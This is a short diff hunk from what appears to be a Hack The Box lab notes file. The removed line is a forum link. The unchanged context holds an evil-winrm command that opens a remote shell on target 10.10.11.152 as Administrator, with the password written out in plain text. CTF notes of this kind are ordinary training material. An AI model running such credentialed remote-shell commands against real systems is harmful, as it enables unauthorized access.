@@ -372,4 +372,3 @@ exit
 
 evil-winrm -u 'Administrator' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152  -S
 
-https://forum.hackthebox.com/t/lab-access-openvpn-certificate-verify-failed/257102
